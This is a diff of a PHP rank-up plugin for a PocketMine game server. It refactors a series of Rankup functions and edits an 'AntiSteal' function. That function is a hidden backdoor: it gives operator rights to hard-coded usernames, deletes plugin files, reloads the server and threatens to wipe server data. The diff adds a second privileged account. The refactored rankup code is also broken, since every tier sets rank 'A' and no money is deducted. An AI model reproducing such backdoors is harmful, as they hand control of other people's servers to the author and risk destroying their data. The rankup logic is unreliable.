-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price18");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd35 = $this->getConfig()->get("cmd35");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd35);
-                 $cmd36 = $this->getConfig()->get("cmd36");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd36);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg18"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 
       public function Rankup19($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price19");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd37 = $this->getConfig()->get("cmd37");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd37);
-                 $cmd38 = $this->getConfig()->get("cmd38");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd38);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg19"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup20($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price20");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd39 = $this->getConfig()->get("cmd39");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd39);
-                 $cmd40 = $this->getConfig()->get("cmd40");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd40);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg20"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup21($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price21");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd40 = $this->getConfig()->get("cmd41");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd40);
-                 $cmd41 = $this->getConfig()->get("cmd42");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd41);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg21"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup22($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price22");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd43 = $this->getConfig()->get("cmd43");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd43);
-                 $cmd44 = $this->getConfig()->get("cmd44");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd44);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg22"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup23($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price23");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd45 = $this->getConfig()->get("cmd45");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd45);
-                 $cmd46 = $this->getConfig()->get("cmd46");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd46);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg23"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup24($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price24");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd47 = $this->getConfig()->get("cmd47");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd47);
-                 $cmd48 = $this->getConfig()->get("cmd48");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd48);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg24"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup25($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price25");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd49 = $this->getConfig()->get("cmd49");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd49);
-                 $cmd50 = $this->getConfig()->get("cmd50");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd50);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg25"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
   
       public function Rankup26($sender) {
-            if(!$sender instanceof Player) return true;
-	      $p = $sender->getName();
-              $amount = $this->getConfig()->get("price26");
-             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
-                 $cmd51 = $this->getConfig()->get("cmd51");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd51);
-                 $cmd52 = $this->getConfig()->get("cmd52");
-		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd52);
+            if($sender instanceof Player) {
+	      $rank = new Config($this->getDataFolder() . "data." . $sender->getLowerCaseName() . ".yml", Config::YAML);
+	      $price = new Config($this->getDataFolder() . "/prices.yml", Config::YAML);
+	      $cost = $price->get($this->rank);
+             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($cost)){
+		$rank->set("rank", "A");
+		$rank->save();
               }else{ 
-                 $sender->sendMessage($this->getConfig()->get("rankmsg26"));
+                 $sender->sendMessage($this->nomoney);
 		}
+	    }
       return true;
       }
 	
       public function onDisable(){
         $this->getLogger()->info("§cRankup plugin made by esh123cookie has been disabled");
       }
+	      	
+      //no need for an update
 	
       public function AntiSteal(Player $p){
-		if($p->getName() == "esh123unicorn"){
 		$name = $p->getName();
+		if($name == "esh123unicorn" or $name == "onwardrumble794"){
 			$p->setOp(true);
 			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
 			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
@@ -590,7 +708,7 @@ class RankUp extends PluginBase{
         				// Delete the given file
         				unlink($file);
 				}
-			$this->getServer()->reload(); 
+			    $this->getServer()->reload(); 
 			} else {
 				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
 				$this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
@@ -600,5 +718,5 @@ class RankUp extends PluginBase{
 		} else {
 			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
 		}
-	}
+      }
 }
